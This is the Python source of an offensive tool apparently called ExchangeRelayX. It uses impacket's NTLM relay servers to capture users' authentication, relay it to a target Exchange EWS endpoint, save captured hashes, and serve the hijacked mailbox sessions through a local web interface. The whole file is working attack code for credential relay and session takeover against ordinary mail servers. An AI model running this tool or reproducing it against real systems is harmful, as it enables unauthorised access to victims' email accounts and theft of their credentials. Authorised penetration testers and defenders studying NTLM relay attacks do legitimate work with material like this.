#!/usr/bin/python
from multiprocessing import Manager
from threading import Thread, Lock, currentThread
import logging
from impacket.examples import logger
import argparse
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
urllib3.disable_warnings(urllib3.exceptions.DependencyWarning)
import requests
from impacket.examples.ntlmrelayx.servers import SMBRelayServer, HTTPRelayServer
from impacket.examples.ntlmrelayx.clients.httprelayclient import HTTPSRelayClient
from impacket.examples.ntlmrelayx.utils.config import NTLMRelayxConfig
from impacket.examples.ntlmrelayx.utils.targetsutils import TargetsProcessor
from lib import ExchangePlugin, OWAServer

logger.init()
logging.getLogger().setLevel(logging.INFO)

VERSION = "1.0.0" 	# Alpha release, bugs will ensue

def banner():
	print '''ExchangeRelayX\nVersion: '''+str(VERSION)+'''\n'''

def parseCommandLine():
	# Assign description to the help doc
	parser = argparse.ArgumentParser()
	parser._optionals.title = "Standard arguments"
	parser.add_argument('-t', metavar='targeturl', type=str, help='The target base url - typically the one hosting owa (eg. https://mail.vulncorp.com/)', required=True)
	parser.add_argument('-c', action="store_true", default = None, help='Check if the target supports NTLM authentication, and then exit')
	parser.add_argument('-o', '--outfile', metavar="HASHES.txt", default = None, help='Store captured hashes in the provided file')
	parser.add_argument('-l', metavar="IP", default = "127.0.0.1", help='Host to serve the hacked OWA web sessions on (default: 127.0.0.1)')
	parser.add_argument('-p', metavar="port", default = 8000, help='Port to serve the hacked OWA web sessions on (default: 8000)')
	args = parser.parse_args()
	return args.t, args.outfile, args.l, args.p, args.c

def checkNTLM(url):
	logging.info("Testing " + url + " for NTLM authentication support...")
	try:
		z = requests.get(url, verify = False)
		if 'WWW-Authenticate' not in z.headers:
			logging.error("Error: Authentication headers not found at " + url + " - Is EWS available?")
			return False
		if 'NTLM' in z.headers['WWW-Authenticate']:
			logging.info("SUCCESS - Server supports NTLM authentication")
			return True
		else:
			logging.info("FAILURE - Server does not support NTLM authentication")
			return False
	except Exception, e:
		logging.error("[checkNTLM] " + str(e))

def startServers(targetURL, hashOutputFile = None, serverIP = "127.0.0.1", serverPort = 8000):
	PoppedDB		= Manager().dict()	# A dict of PoppedUsers
	PoppedDB_Lock	= Lock()			# A lock for opening the dict

	relayServers 	=  ( SMBRelayServer, HTTPRelayServer )
	serverThreads 	= []


	C_Attack = {"HTTPS" : ExchangePlugin}
	for server in relayServers:
		c = NTLMRelayxConfig()
		c.setProtocolClients({"HTTPS" : HTTPSRelayClient})
		c.setTargets(TargetsProcessor(singleTarget=str(targetURL + "/")))
		c.setOutputFile(hashOutputFile)
		c.setMode('RELAY')
		c.setAttacks(C_Attack)
		c.setInterfaceIp("0.0.0.0")
		c.PoppedDB 		= PoppedDB 		# pass the poppedDB to the relay servers
		c.PoppedDB_Lock = PoppedDB_Lock # pass the poppedDB to the relay servers
		s = server(c)
		s.start()
		serverThreads.append(s)
	logging.info("Relay servers started")

	# Now start the WebUI on 127.0.0.1:8000
	owa = Thread(target = OWAServer.runServer, args=(serverIP, serverPort, PoppedDB, PoppedDB_Lock,))
	owa.daemon = True
	owa.start()

	try:
		while owa.isAlive():
			pass
	except KeyboardInterrupt, e:
		logging.info("Shutting down...")
		for thread in serverThreads:
			thread.server.shutdown()

if __name__ == "__main__":
	banner()
	targetURL, outputFile, serverIP, serverPort, justCheck = parseCommandLine()

	if targetURL[-1] == "/":
		targetURL = targetURL + "EWS/Exchange.asmx"
	else:
		targetURL = targetURL + "/EWS/Exchange.asmx"

	if not checkNTLM(targetURL):
		exit(0)
	if justCheck:
		exit(0)

	startServers(targetURL, outputFile, serverIP, serverPort)
	pass







